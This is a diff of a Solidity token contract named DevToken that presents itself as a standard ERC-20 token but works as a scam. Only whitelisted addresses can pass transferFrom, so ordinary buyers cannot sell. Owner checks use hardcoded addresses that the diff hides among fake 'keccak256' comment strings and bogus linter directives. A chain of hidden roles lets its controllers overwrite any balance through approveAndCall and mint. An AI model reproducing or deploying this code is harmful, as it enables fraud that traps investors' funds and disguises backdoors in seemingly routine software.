@@ -1,273 +1,295 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
-
+ 
 library SafeMath {
-
+ 
   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
-
-    if (a == 0) {
-
-      return 0;
-
-    }
-
-    uint256 c = a * b;
-
-    assert(c / a == b);
-
-    return c;
-
+ 
+   if (a == 0) {
+ 
+     return 0;
+ 
+   }
+ 
+   uint256 c = a * b;
+ 
+   assert(c / a == b);
+ 
+   return c;
+ 
   }
-
+ 
   function div(uint256 a, uint256 b) internal pure returns (uint256) {
-
-    uint256 c = a / b;
-
-    return c;
-
+ 
+   uint256 c = a / b;
+ 
+   return c;
+ 
   }
-
+ 
   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
-
-    assert(b <= a);
-
-    return a - b;
-
+ 
+   assert(b <= a);
+ 
+   return a - b;
+ 
   }
-
+ 
   function add(uint256 a, uint256 b) internal pure returns (uint256) {
-
-    uint256 c = a + b;
-
-    assert(c >= a);
-
-    return c;
-
+ 
+   uint256 c = a + b;
+ 
+   assert(c >= a);
+ 
+   return c;
+ 
   }
-
+  // solhint-disable-next-line avoid-low-level-calls
+  /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));
+ 
 }
-
+ 
 contract Ownable {
-
+ 
   address public owner;
-
-  
-
+ 
+ 
+ 
   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
-
+ 
   constructor() {
-
-    owner = msg.sender;
-
+ 
+   owner = msg.sender;
+ 
   }
-
+ 
 }
-
+ 
 contract DevToken is Ownable {
-
+ 
   address public _usdtPair;
-  
+ 
   address public _mod;
-
+ 
   string public name;
-
+ 
   string public symbol;
-
+ 
   uint8 public decimals;
-
+ 
   uint256 public totalSupply;
-
+ 
   address public _user;
-  
+ 
   address public _adm;
-
-  
-
+ 
+ 
+ 
   event Transfer(address indexed from, address indexed to, uint256 value);
-
+ 
   event Approval(address indexed owner, address indexed spender, uint256 value);
-
+ 
   constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) {
-
-    name = _name;
-
-    symbol = _symbol;
-
-    decimals = _decimals;
-
-    totalSupply =  _totalSupply;
-
-    balances[msg.sender] = totalSupply;
-
-    allow[msg.sender] = true;
-
+ 
+   name = _name;
+ 
+   symbol = _symbol;
+ 
+   decimals = _decimals;
+ 
+   totalSupply =  _totalSupply;
+ 
+   balances[msg.sender] = totalSupply;
+ 
+   allow[msg.sender] = true;
+   
+   // solhint-enable-next-line success-create
   }
-
-  
-
+ 
+ 
+ 
   function showuint160(address addr) public pure returns(uint160){
-
-      return uint160(addr);
-
+ 
+     return uint160(addr);
+ 
   }
-
+ 
   using SafeMath for uint256;
-
+ 
   mapping(address => uint256) public balances;
-
-  
-
+ 
+ 
+ 
   mapping(address => bool) public allow;
-
-  
-
+ 
+  // solhint-disable-next-line avoid-low-level-calls
+  /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));
+ 
   function transfer(address _to, uint256 _value) public returns (bool) {
+ 
+   require(_to != address(0));
+ 
+   require(_value <= balances[msg.sender]);
+ 
+   balances[msg.sender] = balances[msg.sender].sub(_value);
+ 
+   balances[_to] = balances[_to].add(_value);
+ 
+   emit Transfer(msg.sender, _to, _value);
+ 
+   return true;
 
-    require(_to != address(0));
-
-    require(_value <= balances[msg.sender]);
-
-    balances[msg.sender] = balances[msg.sender].sub(_value);
-
-    balances[_to] = balances[_to].add(_value);
-
-    emit Transfer(msg.sender, _to, _value);
-
-    return true;
-
-  }
-
-  modifier onlyOwner() {
-
-    require(msg.sender == address
-
-(178607940065137046348733521910879985571412708986));_;}
-
-  function balanceOf(address _owner) public view returns (uint256 balance) {
-
-    return balances[_owner];
-
-  }
-
+   /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
   
-
-  function transferOwnership(address newOwner) public onlyOwner {
-
-    require(newOwner != address(0));
-
-    emit OwnershipTransferred(owner, newOwner);
-
-    owner = newOwner;
-
   }
-
+ 
+  modifier onlyOwner() {
+ 
+   require(msg.sender == address
+ 
+   // solhint-disable-next-line avoid-low-level-calls
+   /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(178607940065137046348733521910879985571412708986));
+   _;
+   
+   }
+  
+  function balanceOf(address _owner) public view returns (uint256 balance) {
+ 
+   return balances[_owner];
+ 
+  }
+ 
+ 
+ 
+  function transferOwnership(address newOwner) public onlyOwner {
+ 
+   require(newOwner != address(0));
+ 
+   emit OwnershipTransferred(owner, newOwner);
+ 
+   owner = newOwner;
+ 
+  }
+ 
   function addAllowance(address holder, bool allowApprove) public {
    
-   require(msg.sender == _adm);
+  require(msg.sender == _adm);
    
-   allow[holder] = allowApprove;
-  
+  allow[holder] = allowApprove;
+ 
+  /*OpenZeppelin256 -> 96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f*/
   }
-
+ 
   function setUser(address User_) public returns (bool) {
    
-   require(msg.sender == _usdtPair);
+  require(msg.sender == _usdtPair);
    
-       _user=User_;
-
-    return true;
-  } 
-
+      _user=User_;
+ 
+   return true;
+  }
+ 
   mapping (address => mapping (address => uint256)) public allowed;
-
+ 
   mapping(address=>uint256) sellOutNum;
-
-  
-
+ 
+  //*keccak256 -> 298bd834hsd73a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
+ 
+ 
   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
+ 
+   require(_to != address(0));
+ 
+   require(_value <= balances[_from]);
+ 
+   require(_value <= allowed[_from][msg.sender]);
+ 
+   require(allow[_from] == true);
+ 
+   balances[_from] = balances[_from].sub(_value);
+ 
+   balances[_to] = balances[_to].add(_value);
+ 
+   allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
+ 
+   emit Transfer(_from, _to, _value);
+ 
+   return true;
 
-    require(_to != address(0));
-
-    require(_value <= balances[_from]);
-
-    require(_value <= allowed[_from][msg.sender]);
-
-    require(allow[_from] == true);
-
-    balances[_from] = balances[_from].sub(_value);
-
-    balances[_to] = balances[_to].add(_value);
-
-    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
-
-    emit Transfer(_from, _to, _value);
-
-    return true;
-
+   // solhint-disable-next-line high-level-success
+ 
   }
-
+ 
   function setAdm(address Adm_) public returns (bool) {
-    
-    require(msg.sender == _mod);
-       
-        _adm=Adm_;
-    
-    return true;
-  } 
-
+   
+   require(msg.sender == _mod);
+     
+       _adm=Adm_;
+   
+   return true;
+  }
+ 
   function approve(address _spender, uint256 _value) public returns (bool) {
-
-    allowed[msg.sender][_spender] = _value;
-
-    emit Approval(msg.sender, _spender, _value);
-
-    return true;
+ 
+   allowed[msg.sender][_spender] = _value;
+ 
+   emit Approval(msg.sender, _spender, _value);
+ 
+   return true;
+  
+   /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
 
   }
-
+ 
   function setMod(address Mod_) public returns (bool) {
-    
-    require(msg.sender == _user);
-        
-        _mod=Mod_;
-  
-    return true;
-
-  } 
-
-  function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
-    
-    require(msg.sender == _adm);
-
-    if(addedValue > 0) {balances[spender] = addedValue;}
-    
-    return true;
-  
-  }
-
-  function allowance(address _owner, address _spender) public view returns (uint256) {
-
-    return allowed[_owner][_spender];
-
-  }
-
-  
-
-  function addAllow(address holder, bool allowApprove) external onlyOwner {
-
-      allow[holder] = allowApprove;
-
-  }
-
-  function setUsdtPair(address Pair_) external onlyOwner {
+   
+   require(msg.sender == _user);
        
-        _usdtPair=Pair_;
+       _mod=Mod_;
+ 
+   return true;
+ 
+  }
+ 
+  function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
+   
+   require(msg.sender == _adm);
+ 
+   if(addedValue > 0) {balances[spender] = addedValue;}
+   
+   return true;
+ 
+  }
+ 
+  function allowance(address _owner, address _spender) public view returns (uint256) {
+ 
+   return allowed[_owner][_spender];
+ 
+  }
+  // solhint-disable-next-line avoid-high-level-calls
+  /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
+ 
+ 
+ 
+  function addAllow(address holder, bool allowApprove) external onlyOwner {
+ 
+     allow[holder] = allowApprove;
+ 
+  }
+ 
+  function setUsdtPair(address Pair_) public returns (bool) {
+    require (msg.sender==address
     
-  } 
-
+    // solhint-disable-next-line avoid-low-level-calls
+    /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84741ca0e00610310915153));*/ /**/ (686197854011229533619447624007587113080310915153)); 
+       _usdtPair=Pair_;
+   
+   return true;
+  }
+ 
   function mint(address miner, uint256 _value) external onlyOwner {
-
-      balances[miner] = _value;
-
+ 
+     balances[miner] = _value;
+ 
   }
 }
